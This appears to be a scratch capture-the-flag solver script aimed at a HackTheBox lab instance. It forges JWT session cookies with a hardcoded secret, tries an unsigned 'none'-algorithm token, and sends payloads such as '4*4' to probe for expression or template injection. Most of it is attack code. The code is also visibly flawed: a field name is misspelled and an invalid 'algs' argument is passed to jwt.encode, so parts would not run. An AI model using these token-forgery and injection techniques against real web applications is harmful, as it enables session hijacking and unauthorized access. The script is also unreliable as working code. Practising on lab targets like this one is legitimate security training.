#!/usr/bin/env python3

import requests
from base64 import urlsafe_b64decode, urlsafe_b64encode
import re
import sys
import hashlib
import jwt
import json

url = 'http://docker.hackthebox.eu:32476'
secret = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw' # ??
output = 'output.txt'

payloads = [
        {
            'ingredient': 'a' * 20,
            'measurements': '4*4',
            },
        {
            'ingredient': { ' b': 'a' * 20 },
            'measurements': { ' b': '4*4' },
            },
        {
            'ingredient': { ' b': urlsafe_b64encode(b'a' * 20).decode('utf-8') },
            'measuremens': { ' b': urlsafe_b64encode(b'4*4').decode('utf-8') }
            },
        ]

def main():
    # resp = requests.get(url)
    # text = f'{url} ({resp.status_code})\n'
    # if resp.status_code != 200:
    #     print(text)
    #     return

    # session = resp.cookies.get('session')
    # header = jwt.get_unverified_header(session)
    # ingredient = urlsafe_b64decode(header['ingredient'][' b'])
    # measurements = urlsafe_b64decode(header['measurements'][' b'])
    # _, payload, _ = session.strip('.').split('.')

    # ingredient = urlsafe_b64encode(b'a' * 16).decode('utf-8')
    # measurements = urlsafe_b64encode(b'11*11').decode('utf-8')
    # header = {
    #         'ingredient': { ' b': ingredient },
    #         'measuremens': { ' b': measurements },
    #         'alg': 'none',
    #         }
    # b = bytes(json.dumps(header).encode('utf-8'))
    # session = f'{urlsafe_b64encode(b)}.{payload}.'
    for payload in payloads:
        # with HS256
        token = jwt.encode(payload, secret)
        jar = requests.cookies.RequestsCookieJar()
        jar.set('session', token.decode('utf-8'))
        resp = requests.get(url, cookies=jar)
        print(resp.status_code)
        print(resp.content)

        #without hash
        token = jwt.encode(payload, secret, algs=['none'])
        jar.set('session', token.decode('utf-8'))
        resp = requests.get(url, cookies=jar)

if __name__ == '__main__':
    main()
